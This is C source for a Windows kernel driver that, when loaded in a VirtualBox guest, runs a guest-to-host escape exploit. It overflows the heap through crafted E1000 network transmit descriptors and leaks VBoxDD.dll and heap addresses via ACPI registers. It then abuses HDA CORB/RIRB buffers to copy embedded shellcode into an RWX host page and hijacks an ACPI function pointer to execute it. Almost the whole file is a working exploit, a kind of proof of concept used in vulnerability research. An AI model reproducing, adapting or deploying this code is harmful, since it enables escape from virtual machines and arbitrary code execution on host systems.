#pragma warning(error:4)
#define IN_RING0
#define VBOX_WITH_VDMA
#define VBOX_WITH_VIDEOHWACCEL

#include <ntifs.h>
#include <ntddk.h>
#include <string.h>
#include <Ntstrsafe.h>
#include "vboxvideoguest.h"
#include "vboxvideo.h"
#include "vboxvideovbe.h"

#define IOCTL_TYPE 40000
#define IOCTL_HGSMI_CONNECT CTL_CODE( IOCTL_TYPE, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS  )
#define NT_DEVICE_NAME      L"\\Device\\vboxPwn"
#define DOS_DEVICE_NAME     L"\\DosDevices\\vboxPwn"
#define EXPLOIT_OFFICIAL_BUILD 1


typedef struct pwn_VBVA_request {
	uint32_t type;
	uint32_t size;
	uint64_t vbva_command;
	char data[1];
} pwn_VBVA_request;


PDRIVER_OBJECT GLOBAL_DRIVER_OBJECT;
#define E1K_PHYSIC 0xf0000000
#define E1K_SIZE 0x20000
#define E1K_IOPORT_BASE 0xD000	
#define HDA_MMIO_PHYSIC  0xf0804000
#define HDA_MMIO_SIZE  0x1000


uint8_t exec_calc_shellcode[] = { 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x68, 0x5D, 0x5F, 0x5E, 0x5B, 0x48, 0x31, 0xc0, 0xC3 };
uint8_t* shellcode = NULL;
PHYSICAL_ADDRESS shellcode_physic;

uint8_t* TransmitDescriptorBase = NULL;
uint8_t* MAPPED_HDA_MMIO = NULL;
uint64_t* RIRB_virtual = NULL;

// BACKUP HDA 
uint32_t old_rirb_lowpart = 0;
uint32_t old_rirb_highpart = 0;
uint32_t old_corb_lowpart = 0;
uint32_t old_corb_highpart = 0;

DRIVER_INITIALIZE DriverEntry;
_Dispatch_type_(IRP_MJ_CREATE)
_Dispatch_type_(IRP_MJ_CLOSE)
DRIVER_DISPATCH SioctlCreateClose;
_Dispatch_type_(IRP_MJ_DEVICE_CONTROL)
DRIVER_DISPATCH SioctlDeviceControl;
DRIVER_UNLOAD SioctlUnloadDriver;

void run_exploit();

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT   DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	NTSTATUS        ntStatus;
	UNICODE_STRING  ntUnicodeString;
	UNICODE_STRING  ntWin32NameString;
	PDEVICE_OBJECT  deviceObject = NULL;
	GLOBAL_DRIVER_OBJECT = DriverObject;

	UNREFERENCED_PARAMETER(RegistryPath);

	RtlInitUnicodeString(&ntUnicodeString, NT_DEVICE_NAME);

	ntStatus = IoCreateDevice(DriverObject, 0, &ntUnicodeString, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);

	if (!NT_SUCCESS(ntStatus))
	{
		DbgPrint(("Couldn't create the device object\n"));
		return ntStatus;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = SioctlCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SioctlCreateClose;
	DriverObject->DriverUnload = SioctlUnloadDriver;

	RtlInitUnicodeString(&ntWin32NameString, DOS_DEVICE_NAME);
	ntStatus = IoCreateSymbolicLink(&ntWin32NameString, &ntUnicodeString);
	if (!NT_SUCCESS(ntStatus))
	{
		DbgPrint(("Couldn't create symbolic link\n"));
		IoDeleteDevice(deviceObject);
	}

	run_exploit();

	return ntStatus;
}

NTSTATUS SioctlCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	PAGED_CODE();

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

VOID SioctlUnloadDriver(_In_ PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT deviceObject = DriverObject->DeviceObject;
	UNICODE_STRING uniWin32NameString;

	PAGED_CODE();

	RtlInitUnicodeString(&uniWin32NameString, DOS_DEVICE_NAME);

	IoDeleteSymbolicLink(&uniWin32NameString);

	if (deviceObject != NULL)
	{
		IoDeleteDevice(deviceObject);
	}
}

void reg_set(uint32_t index, uint32_t value)
{
	int16_t set_reg_index = E1K_IOPORT_BASE;
	int16_t set_reg_value = E1K_IOPORT_BASE + 4;
	ASMOutU32(set_reg_index, index);
	ASMOutU32(set_reg_value, value);
}

uint32_t reg_get(uint32_t index)
{
	int16_t set_reg_index = E1K_IOPORT_BASE;
	int16_t set_reg_value = E1K_IOPORT_BASE + 4;
	ASMOutU32(set_reg_index, index);
	return ASMInU32(set_reg_value);
}

#define E1K_DTYP_LEGACY -1
#define E1K_DTYP_CONTEXT 0
#define E1K_DTYP_DATA    1
#define E1K_SPEC_VLAN(s)    (s      & 0xFFF)
#define E1K_SPEC_CFI(s) (!!((s>>12) & 0x1))
#define E1K_SPEC_PRI(s)    ((s>>13) & 0x7)

struct E1kTDLegacy
{
	uint64_t u64BufAddr;                     /**< Address of data buffer */
	struct TDLCmd_st
	{
		unsigned u16Length : 16;
		unsigned u8CSO : 8;
		/* CMD field       : 8 */
		unsigned fEOP : 1;
		unsigned fIFCS : 1;
		unsigned fIC : 1;
		unsigned fRS : 1;
		unsigned fRPS : 1;
		unsigned fDEXT : 1;
		unsigned fVLE : 1;
		unsigned fIDE : 1;
	} cmd;
	struct TDLDw3_st
	{
		/* STA field */
		unsigned fDD : 1;
		unsigned fEC : 1;
		unsigned fLC : 1;
		unsigned fTURSV : 1;
		/* RSV field */
		unsigned u4RSV : 4;
		/* CSS field */
		unsigned u8CSS : 8;
		/* Special field*/
		unsigned u16Special : 16;
	} dw3;
};
struct E1kTDContext
{
	struct CheckSum_st
	{
		/** TSE: Header start. !TSE: Checksum start. */
		unsigned u8CSS : 8;
		/** Checksum offset - where to store it. */
		unsigned u8CSO : 8;
		/** Checksum ending (inclusive) offset, 0 = end of packet. */
		unsigned u16CSE : 16;
	} ip;
	struct CheckSum_st tu;
	struct TDCDw2_st
	{
		/** TSE: The total number of payload bytes for this context. Sans header. */
		unsigned u20PAYLEN : 20;
		/** The descriptor type - E1K_DTYP_CONTEXT (0). */
		unsigned u4DTYP : 4;
		/** TUCMD field, 8 bits
		* @{ */
		/** TSE: TCP (set) or UDP (clear). */
		unsigned fTCP : 1;
		/** TSE: IPv4 (set) or IPv6 (clear) - for finding the payload length field in
		* the IP header.  Does not affect the checksumming.
		* @remarks 82544GC/EI interprets a cleared field differently.  */
		unsigned fIP : 1;
		/** TSE: TCP segmentation enable.  When clear the context describes  */
		unsigned fTSE : 1;
		/** Report status (only applies to dw3.fDD for here). */
		unsigned fRS : 1;
		/** Reserved, MBZ. */
		unsigned fRSV1 : 1;
		/** Descriptor extension, must be set for this descriptor type. */
		unsigned fDEXT : 1;
		/** Reserved, MBZ. */
		unsigned fRSV2 : 1;
		/** Interrupt delay enable. */
		unsigned fIDE : 1;
		/** @} */
	} dw2;
	struct TDCDw3_st
	{
		/** Descriptor Done. */
		unsigned fDD : 1;
		/** Reserved, MBZ. */
		unsigned u7RSV : 7;
		/** TSO: The header (prototype) length (Ethernet[, VLAN tag], IP, TCP/UDP. */
		unsigned u8HDRLEN : 8;
		/** TSO: Maximum segment size. */
		unsigned u16MSS : 16;
	} dw3;
};
typedef struct E1kTDContext E1KTXCTX;
struct E1kTDData
{
	uint64_t u64BufAddr;                        /**< Address of data buffer */
	struct TDDCmd_st
	{
		/** The total length of data pointed to by this descriptor. */
		unsigned u20DTALEN : 20;
		/** The descriptor type - E1K_DTYP_DATA (1). */
		unsigned u4DTYP : 4;
		/** @name DCMD field, 8 bits (3.3.7.1).
		* @{ */
		/** End of packet.  Note TSCTFC update.  */
		unsigned fEOP : 1;
		/** Insert Ethernet FCS/CRC (requires fEOP to be set). */
		unsigned fIFCS : 1;
		/** Use the TSE context when set and the normal when clear. */
		unsigned fTSE : 1;
		/** Report status (dw3.STA). */
		unsigned fRS : 1;
		/** Reserved. 82544GC/EI defines this report packet set (RPS).  */
		unsigned fRPS : 1;
		/** Descriptor extension, must be set for this descriptor type. */
		unsigned fDEXT : 1;
		/** VLAN enable, requires CTRL.VME, auto enables FCS/CRC.
		*  Insert dw3.SPECIAL after ethernet header. */
		unsigned fVLE : 1;
		/** Interrupt delay enable. */
		unsigned fIDE : 1;
		/** @} */
	} cmd;
	struct TDDDw3_st
	{
		/** @name STA field (3.3.7.2)
		* @{  */
		unsigned fDD : 1;                       /**< Descriptor done. */
		unsigned fEC : 1;                      /**< Excess collision. */
		unsigned fLC : 1;                        /**< Late collision. */
		/** Reserved, except for the usual oddball (82544GC/EI) where it's called TU. */
		unsigned fTURSV : 1;
		/** @} */
		unsigned u4RSV : 4;                   /**< Reserved field, MBZ. */
		/** @name POPTS (Packet Option) field (3.3.7.3)
		* @{  */
		unsigned fIXSM : 1;                    /**< Insert IP checksum. */
		unsigned fTXSM : 1;               /**< Insert TCP/UDP checksum. */
		unsigned u6RSV : 6;                         /**< Reserved, MBZ. */
		/** @} */
		/** @name SPECIAL field - VLAN tag to be inserted after ethernet header.
		* Requires fEOP, fVLE and CTRL.VME to be set.
		* @{ */
		unsigned u16Special : 16;   /**< VLAN: Id, Canonical form, Priority. */
		/** @}  */
	} dw3;
};
typedef struct E1kTDData E1KTXDAT;
union E1kTxDesc
{
	struct E1kTDLegacy  legacy;
	struct E1kTDContext context;
	struct E1kTDData    data;
};
typedef union  E1kTxDesc E1KTXDESC;

void trigger_heap_overflow(uint8_t* data, uint32_t size)
{
	E1KTXDESC *payload = MmAllocateNonCachedMemory(sizeof(E1KTXDESC)* 5);
	if (!payload)
	{
		DbgPrint("Alloc payload failed\n");
		return;
	}

	memset(payload, 0, sizeof(E1KTXDESC)* 5);

	uint32_t overwrite_size = 4 + size;


	PHYSICAL_ADDRESS payload_physic, content_physic;
	payload_physic = MmGetPhysicalAddress(payload);
	content_physic = MmGetPhysicalAddress(data);

	uint32_t old_lowpart = reg_get(0x03800);
	uint32_t old_highpart = reg_get(0x03804);
	uint32_t old_head = reg_get(0x03810);
	uint32_t old_tail = reg_get(0x03818);

	reg_set(0x03800, payload_physic.LowPart);
	reg_set(0x03804, payload_physic.HighPart);

	payload[0].context.dw2.u4DTYP = E1K_DTYP_CONTEXT;
	payload[0].context.dw2.fDEXT = 1;
	payload[0].context.dw2.fTSE = 1;
	payload[0].context.dw3.u8HDRLEN = 0;
	payload[0].context.dw3.u16MSS = 0x3fa0 - 1 - 4;
	payload[0].context.dw2.u20PAYLEN = 0x10000;
	//e1kPrintTDesc(&payload[0]);

	payload[1].data.u64BufAddr = content_physic.QuadPart;
	payload[1].data.cmd.u4DTYP = E1K_DTYP_DATA;
	payload[1].data.cmd.fDEXT = 1;
	payload[1].data.cmd.fTSE = 1;
	payload[1].data.cmd.u20DTALEN = 0x3fa0 - 2 - 4;
	//e1kPrintTDesc(&payload[1]);

	payload[2].data.u64BufAddr = content_physic.QuadPart;
	payload[2].data.cmd.u4DTYP = E1K_DTYP_DATA;
	payload[2].data.cmd.fDEXT = 1;
	payload[2].data.cmd.fTSE = 0;
	payload[2].data.cmd.u20DTALEN = 0x2;
	//e1kPrintTDesc(&payload[2]);

	payload[3].data.u64BufAddr = content_physic.QuadPart;
	payload[3].data.cmd.u4DTYP = E1K_DTYP_DATA;
	payload[3].data.cmd.fDEXT = 1;
	payload[3].data.cmd.fTSE = 1;
	payload[3].data.cmd.u20DTALEN = overwrite_size;
	//e1kPrintTDesc(&payload[3]);

	payload[4].data.u64BufAddr = content_physic.QuadPart;
	payload[4].data.cmd.u4DTYP = E1K_DTYP_DATA;
	payload[4].data.cmd.fDEXT = 1;
	payload[4].data.cmd.fTSE = 1;
	payload[4].data.cmd.fEOP = 1;
	payload[4].data.cmd.u20DTALEN = 0;
	//e1kPrintTDesc(&payload[4]);

	reg_set(0x03810, 0);
	reg_set(0x03818, 0x50);

	while (reg_get(0x03810) == 0);

	reg_set(0x03810, old_head);
	reg_set(0x03818, old_tail);
	reg_set(0x03800, old_lowpart);
	reg_set(0x03804, old_highpart);
}

void write_value_to_eeprom_offset(uint16_t offset, uint16_t value)
{
	reg_set(0x00010, 0xff);

	uint8_t origin_overwritten_data[] = { 0x00, 0x00, 0x00, 0x00, 0x9C, 0x3F, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x27, 0xCA, 0x78, 0x98, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x44, 0x1E, 0x00, 0x86, 0x80, 0x0E, 0x10, 0x86, 0x80, 0x40, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x61, 0x70, 0x0C, 0x28, 0xC8, 0x00, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x95, 0x32, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x44, 0x44, 0x01, 0x00, 0x66, 0x66, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
	uint16_t *aaa = MmAllocateNonCachedMemory(sizeof(origin_overwritten_data));
	if (!aaa)
	{
		DbgPrint("Alloc aaa failed\n");
		return;
	}
	memcpy(aaa, origin_overwritten_data, sizeof(origin_overwritten_data));
	aaa[0x51] = value;
	aaa[0x53] = offset;
	trigger_heap_overflow(aaa, sizeof(origin_overwritten_data));

	reg_set(0x00010, 0xff);

	MmFreeNonCachedMemory(aaa, sizeof(origin_overwritten_data));
}

void write_word(uint64_t offset, uint64_t value)
{
	write_value_to_eeprom_offset(offset, value);
}

void write_qword(uint64_t offset, uint64_t value)
{
	write_value_to_eeprom_offset(offset, value & 0xffff);
	write_value_to_eeprom_offset(offset + 1, (value >> 16) & 0xffff);
	write_value_to_eeprom_offset(offset + 2, (value >> 32) & 0xffff);
	write_value_to_eeprom_offset(offset + 3, (value >> 48) & 0xffff);
}

bool init_exploit()
{
	if (!RIRB_virtual)
	{
		RIRB_virtual = MmAllocateNonCachedMemory(0x800);
		if (!RIRB_virtual)
		{
			DbgPrint("Alloc RIRB_virtual failed\n");
			return false;
		}
	}

	PHYSICAL_ADDRESS RIRB_phys;
	RIRB_phys = MmGetPhysicalAddress(RIRB_virtual);

	PHYSICAL_ADDRESS HDA_MMIO_BASE;
	HDA_MMIO_BASE.QuadPart = HDA_MMIO_PHYSIC;

	MAPPED_HDA_MMIO = (PVOID)MmMapIoSpace(HDA_MMIO_BASE, HDA_MMIO_SIZE, MmNonCached);

	if (!old_rirb_lowpart)
	{
		old_rirb_lowpart = *(uint32_t*)&MAPPED_HDA_MMIO[0x50];
		old_rirb_highpart = *(uint32_t*)&MAPPED_HDA_MMIO[0x54];
		old_corb_lowpart = *(uint32_t*)&MAPPED_HDA_MMIO[0x40];
		old_corb_highpart = *(uint32_t*)&MAPPED_HDA_MMIO[0x44];
	}

	*(uint32_t*)&MAPPED_HDA_MMIO[0x50] = RIRB_phys.LowPart;
	*(uint32_t*)&MAPPED_HDA_MMIO[0x54] = RIRB_phys.HighPart;

	if (!shellcode)
	{
		shellcode = MmAllocateNonCachedMemory(0x400);
		memset(shellcode, 0x90, 0x400);
		memcpy(shellcode, exec_calc_shellcode, sizeof(exec_calc_shellcode));
		shellcode_physic = MmGetPhysicalAddress(shellcode);
	}

	return true;
}

void clean_exploit()
{
	*(uint32_t*)&MAPPED_HDA_MMIO[0x50] = old_rirb_lowpart;
	*(uint32_t*)&MAPPED_HDA_MMIO[0x54] = old_rirb_highpart;
	*(uint32_t*)&MAPPED_HDA_MMIO[0x40] = old_corb_lowpart;
	*(uint32_t*)&MAPPED_HDA_MMIO[0x44] = old_corb_highpart;
}

void run_exploit()
{
	uint64_t leaked_acpiR3Pm1aEnWrite_addr = 0;
	uint64_t leaked_E1K_dev_obj_addr = 0;
	uint64_t leaked_RWX_page_address = 0;
	uint64_t leaked_vboxdd_base = 0;
	uint64_t leaked_heap_addr = 0;

	uint64_t CORB_buff_addr = 0;
	uint64_t old_CORB_buff = 0;

	uint32_t offset_to_acpiR3SMBusRead_u8SMBusBlkIdx = 0x3237;
	uint32_t offset_to_acpiR3Pm1aEnWrite = 0x32d4;
	uint32_t offset_to_ACPI_RSDP_string = 0x8a;
	uint32_t offset_to_heap_address = 0x82;
	uint32_t offset_to_CORB_buff = 0xfd0;
	uint32_t offset_to_RIRB_buff = 0xfd8;

	if (!init_exploit())
	{
		DbgPrint("Init exploit failed!\n");
		return false;
	}

	// LEAK VBOXDD.DLL STRING OFFSET
	for (int i = 0; i < 8; i++)
	{
		write_word(offset_to_acpiR3SMBusRead_u8SMBusBlkIdx, offset_to_ACPI_RSDP_string + i);
		uint64_t leaked_byte = ASMInU8(0x4107);
		leaked_vboxdd_base |= leaked_byte << (8 * i);
	}
	///////////////////////////////////////////////////////////////////////////////////////////////////

	// LEAK HEAP ADDRESS
	for (int i = 0; i < 8; i++)
	{
		write_word(offset_to_acpiR3SMBusRead_u8SMBusBlkIdx, offset_to_heap_address + i);
		uint64_t leaked_byte = ASMInU8(0x4107);
		leaked_heap_addr |= leaked_byte << (8 * i);
	}
	///////////////////////////////////////////////////////////////////////////////////////////////////

	if (EXPLOIT_OFFICIAL_BUILD)
	{
		leaked_vboxdd_base -= 0x12E948;
		leaked_acpiR3Pm1aEnWrite_addr = leaked_vboxdd_base + 0x2EC10;
	}
	else
	{
		leaked_vboxdd_base -= 0x12EB98;
		leaked_acpiR3Pm1aEnWrite_addr = leaked_vboxdd_base + 0x2FAC0;
	}

	leaked_E1K_dev_obj_addr = leaked_heap_addr - 0xa508;
	leaked_RWX_page_address = (leaked_E1K_dev_obj_addr & 0xfffffffffff00000) + 0x300000;
	CORB_buff_addr = leaked_E1K_dev_obj_addr + 0x71b0;

	DbgPrint("RWX page address ADDRESS: 0x%llx\n", leaked_RWX_page_address);
	DbgPrint("E1K DEV OBJECT ADDRESS: 0x%llx\n", leaked_E1K_dev_obj_addr);
	DbgPrint("VBOXDD.DLL BASE: 0x%llx\n", leaked_vboxdd_base);
	DbgPrint("HEAP ADDRESS: 0x%llx\n", leaked_heap_addr);

	// BACKUP ORIGINAL CORB BUFFER ADDRESS
	write_qword(offset_to_RIRB_buff, CORB_buff_addr);							// REPLACE RIRB BUFFER BY CORB BUFFER

	*(uint8_t*)&MAPPED_HDA_MMIO[0x4c] = 1ull << 1;

	old_CORB_buff = RIRB_virtual[0];
	DbgPrint("OLD CORB buff address: 0x%llx\n", old_CORB_buff);

	write_qword(offset_to_RIRB_buff, leaked_RWX_page_address + 0x800);			// JUST PUT SOME RANDOM HEAP ADDR, NEED TO FIX THIS

	///////////////////////////////////////////////////////////////////////////////////////////////////

	// WRITE SHELLCODE TO CORB BUFFER
	write_qword(offset_to_CORB_buff, leaked_RWX_page_address);					// REPLACE CORB BUFFER BY RWX PAGE

	*(uint32_t*)&MAPPED_HDA_MMIO[0x40] = shellcode_physic.LowPart;
	*(uint32_t*)&MAPPED_HDA_MMIO[0x44] = shellcode_physic.HighPart;

	*(uint8_t*)&MAPPED_HDA_MMIO[0x4c] = 1ull << 1;

	write_qword(offset_to_CORB_buff, old_CORB_buff);							// RETORE CORB BUFFER
	///////////////////////////////////////////////////////////////////////////////////////////////////

	// EXECUTE SHELLCODE
	write_qword(offset_to_acpiR3Pm1aEnWrite, leaked_RWX_page_address);			// REPLACE acpiR3Pm1aEnWrite() FUNCTION BY SHELLCODE ADDRESS
	ASMOutU16(0x4002, 0x6161);													// CALL acpiR3Pm1aEnWrite()
	write_qword(offset_to_acpiR3Pm1aEnWrite, leaked_acpiR3Pm1aEnWrite_addr);	// RESTORE acpiR3Pm1aEnWrite()
	///////////////////////////////////////////////////////////////////////////////////////////////////

	clean_exploit();		// STILL NOT RESTORE RIRB BUFFER
}
